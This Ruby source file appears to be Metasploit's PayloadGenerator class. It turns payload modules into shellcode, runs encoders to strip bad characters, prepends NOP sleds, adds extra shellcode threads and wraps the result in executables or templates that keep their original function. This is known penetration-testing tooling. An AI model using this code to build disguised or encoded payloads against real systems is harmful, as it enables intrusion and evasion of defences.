module Msf

  class IncompatiblePlatform < StandardError
  end

  class IncompatibleArch < StandardError
  end

  class IncompatibleEndianess < StandardError
  end

  class EncoderSpaceViolation < StandardError
  end

  class InvalidFormat < StandardError
  end

  class PayloadGenerator


    attr_accessor :add_code
    attr_accessor :arch
    attr_accessor :badchars
    attr_accessor :cli
    attr_accessor :datastore
    attr_accessor :encoder
    attr_accessor :format
    attr_accessor :framework
    attr_accessor :iterations
    attr_accessor :keep
    attr_accessor :nops
    attr_accessor :payload
    attr_accessor :platform
    attr_accessor :space
    attr_accessor :stdin
    attr_accessor :template


    # @param opts [Hash] The options hash
    # @option opts [String] :payload The refname of the payload to generate
    # @option opts [String] :format The format you want the payload returned in
    # @option opts [String] :encoder The encoder you want applied to the payload
    # @option opts [Fixnum] :iterations The number of iterations to run the encoder
    # @option opts [String] :arch The CPU architecture to build the payload for
    # @option opts [String] :platform The platform to build the payload for
    # @option opts [String] :badchars The bad characters that can't be in the payload
    # @option opts [String] :template The path to the template file to use
    # @option opts [Fixnum] :space The maximum size in bytes of the payload
    # @option opts [Fixnum] :nops The size in bytes of NOP sled to prepend the payload with
    # @option opts [String] :add_code The path to a shellcode file to execute in a seperate thread
    # @option opts [Boolean] :keep Whether or not to preserve the original functionality of the template
    # @option opts [Hash] :datastore The datastore to apply to the payload module
    # @option opts [Msf::Framework] :framework The framework instance to use for generation
    # @option opts [Booleab] :cli Whether this is being run by a CLI script
    def initialize(opts={})
      @add_code   = opts.fetch(:add_code, '')
      @arch       = opts.fetch(:arch, '')
      @badchars   = opts.fetch(:badchars, '')
      @cli        = opts.fetch(:cli, false)
      @datastore  = opts.fetch(:datastore, {})
      @encoder    = opts.fetch(:encoder, '')
      @format     = opts.fetch(:format, 'raw')
      @iterations = opts.fetch(:iterations, 1)
      @keep       = opts.fetch(:keep, false)
      @nops       = opts.fetch(:nops, 0)
      @payload    = opts.fetch(:payload, '')
      @platform   = opts.fetch(:platform, '')
      @space      = opts.fetch(:space, 1073741824)
      @stdin      = opts.fetch(:stdin, nil)
      @template   = opts.fetch(:template, '')

      @framework  = opts.fetch(:framework)

      raise ArgumentError, "Invalid Payload Selected" unless payload_is_valid?
      raise ArgumentError, "Invalid Format Selected" unless format_is_valid?
    end

    # @param shellcode [String] The shellcode to add to
    # @return [String] the combined shellcode which executes the added code in a seperate thread
    def add_shellcode(shellcode)
      if add_code.present? and platform_list.platforms.include? Msf::Module::Platform::Windows and arch == "x86"
        cli_print "Adding shellcode from #{add_code} to the payload"
        shellcode_file = File.open(add_code)
        shellcode_file.binmode
        added_code = shellcode_file.read
        shellcode_file.close
        shellcode = ::Msf::Util::EXE.win32_rwx_exec_thread(shellcode,0,'end')
        shellcode << added_code
      else
        shellcode.dup
      end
    end

    # @param mod [Msf::Payload] The module class to choose an arch for
    # @return [String] String form of the Arch if a valid arch found
    # @return [Nil] if no valid arch found
    def choose_arch(mod)
      if arch.blank?
        @arch = mod.arch.first
        cli_print "No Arch selected, selecting Arch: #{arch} from the payload"
        return mod.arch.first
      elsif mod.arch.include? arch
        return arch
      else
        return nil
      end
    end

    # @param mod [Msf::Payload] The module class to choose a platform for
    # @return [Msf::Module::PlatformList] The selected platform list
    def choose_platform(mod)
      chosen_platform = platform_list
      if chosen_platform.platforms.empty?
        chosen_platform = mod.platform
        cli_print "No platform was selected, choosing #{chosen_platform.platforms.first} from the payload"
        @platform = mod.platform.platforms.first.to_s.split("::").last
      elsif (chosen_platform & mod.platform).empty?
        chosen_platform = Msf::Module::PlatformList.new
      end
      chosen_platform
    end

    # @param shellcode [String] The shellcode to encode
    # @return [String] The encoded shellcode
    def encode_payload(shellcode)
      shellcode = shellcode.dup
      encoder_list = get_encoders
      cli_print "Found #{encoder_list.count} compatible encoders"
      if encoder_list.empty?
        shellcode
      else
        encoder_list.each do |encoder_mod|
          cli_print "Attempting to encode payload with #{iterations} iterations of #{encoder_mod.refname}"
          begin
            return run_encoder(encoder_mod, shellcode.dup)
          rescue ::Msf::EncoderSpaceViolation => e
            cli_print "#{encoder_mod.refname} failed with #{e.message}"
            next
          rescue ::Msf::EncodingError => e
            cli_print "#{encoder_mod.refname} failed with #{e.message}"
            next
          end
        end
        raise ::Msf::EncodingError, "No Encoder Succeeded"
      end
    end

    # @return [Hash] The hash needed for generating an executable format
    def exe_options
      opts = { inject: keep }
      unless template.blank?
        opts[:template_path] = File.dirname(template)
        opts[:template]      = File.basename(template)
      end
      opts
    end

    # @param shellcode [String] the processed shellcode to be formatted
    # @return [String] The final formatted form of the payload
    def format_payload(shellcode)
      case format.downcase
        when "js_be"
          if Rex::Arch.endian(arch) != ENDIAN_BIG
            raise IncompatibleEndianess, "Big endian format selected for a non big endian payload"
          else
            ::Msf::Simple::Buffer.transform(shellcode, format)
          end
        when *::Msf::Simple::Buffer.transform_formats
          ::Msf::Simple::Buffer.transform(shellcode, format)
        when *::Msf::Util::EXE.to_executable_fmt_formats
          ::Msf::Util::EXE.to_executable_fmt(framework, arch, platform, shellcode, format, exe_options)
        else
          raise InvalidFormat, "you have selected an invalid payload format"
      end
    end

    # @return [String] Java payload as a JAR or WAR file
    def generate_java_payload
      payload_module = framework.payloads.create(payload)
      case format
        when "war"
          if payload_module.respond_to? :generate_war
            payload_module.generate_war.pack
          else
            raise InvalidFormat, "#{payload} is not a Java payload"
          end
        when "raw"
          if payload_module.respond_to? :generate_jar
            payload_module.generate_jar.pack
          else
            raise InvalidFormat, "#{payload} is not a Java payload"
          end
        else
          raise InvalidFormat, "#{format} is not a valid format for Java payloads"
      end
    end

    # @return [String] A string containing the bytes of the payload in the format selected
    def generate_payload
      if platform == "java" or arch == "java" or payload.start_with? "java/"
        generate_java_payload
      else
        raw_payload = generate_raw_payload
        raw_payload = add_shellcode(raw_payload)
        encoded_payload = encode_payload(raw_payload)
        encoded_payload = prepend_nops(encoded_payload)
        format_payload(encoded_payload)
      end
    end



    # @raise [Msf::IncompatiblePlatform] if no platform was selected for a stdin payload
    # @raise [Msf::IncompatibleArch] if no arch was selected for a stdin payload
    # @raise [Msf::IncompatiblePlatform] if the platform is incompatible with the payload
    # @raise [Msf::IncompatibleArch] if the arch is incompatible with the payload
    # @return [String] the raw bytes of the payload to be generated
    def generate_raw_payload
      if payload == 'stdin'
        if arch.blank?
          raise IncompatibleArch, "You must select an arch for a custom payload"
        elsif platform.blank?
          raise IncompatiblePlatform, "You must select a platform for a custom payload"
        end
        stdin
      else
        payload_module = framework.payloads.create(payload)

        chosen_platform = choose_platform(payload_module)
        if chosen_platform.platforms.empty?
          raise IncompatiblePlatform, "The selected platform is incompatible with the payload"
        end

        chosen_arch = choose_arch(payload_module)
        unless chosen_arch
          raise IncompatibleArch, "The selected arch is incompatible with the payload"
        end

        payload_module.generate_simple(
            'Format'   => 'raw',
            'Options'  => datastore,
            'Encoder'  => nil
        )
      end
    end

    # @return [Array<Msf::Encoder>] An array of potential encoders to use
    def get_encoders
      encoders = []
      if encoder.present?
        # Allow comma seperated list of encoders so users can choose several
        encoder.split(',').each do |chosen_encoder|
          encoders << framework.encoders.create(chosen_encoder)
        end
        encoders.sort_by { |my_encoder| my_encoder.rank }.reverse
      elsif badchars.present?
        framework.encoders.each_module_ranked('Arch' => [arch]) do |name, mod|
          encoders << framework.encoders.create(name)
        end
        encoders.sort_by { |my_encoder| my_encoder.rank }.reverse
      else
        encoders
      end
    end

    # @return [Msf::Module::PlatformList] It will be empty if no valid platforms found
    def platform_list
      if platform.blank?
        list = Msf::Module::PlatformList.new
      else
        begin
          list = ::Msf::Module::PlatformList.transform(platform)
        rescue
          list = Msf::Module::PlatformList.new
        end
      end
      list
    end

    # @param shellcode [String] The shellcode to prepend the NOPs to
    # @return [String] the shellcode with the appropriate nopsled affixed
    def prepend_nops(shellcode)
      if nops > 0
        framework.nops.each_module_ranked('Arch' => [arch]) do |name, mod|
          nop = framework.nops.create(name)
          raw = nop.generate_sled(nops, {'BadChars' => badchars, 'SaveRegisters' => [ 'esp', 'ebp', 'esi', 'edi' ] })
          if raw
            cli_print "Successfully added NOP sled from #{name}"
            return raw + shellcode
          end
        end
      else
        return shellcode
      end
    end

    # @param encoder_module [Msf::Encoder] The Encoder to run against the shellcode
    # @param shellcode [String] The shellcode to be encoded
    # @return [String] The encoded shellcode
    # @raise [Msf::EncoderSpaceViolation] If the Encoder makes the shellcode larger than the supplied space limit
    def run_encoder(encoder_module, shellcode)
      iterations.times do |x|
        shellcode = encoder_module.encode(shellcode.dup, badchars, nil, platform_list)
        cli_print "#{encoder_module.refname} succeeded with size #{shellcode.length} (iteration=#{x})"
        raise EncoderSpaceViolation, "encoder has made a buffer that is too big" if shellcode.length > space
      end
      shellcode
    end

    private

    def cli_print(message= '')
      puts message if cli
    end

    # @return [True] if the format is valid
    # @return [False] if the format is not valid
    def format_is_valid?
      formats = (::Msf::Util::EXE.to_executable_fmt_formats + ::Msf::Simple::Buffer.transform_formats).uniq
      formats.include? format.downcase
    end

    # @return [True] if the payload is a valid Metasploit Payload
    # @return [False] if the payload is not a valid Metasploit Payload
    def payload_is_valid?
      (framework.payloads.keys + ['stdin']).include? payload
    end

  end
end
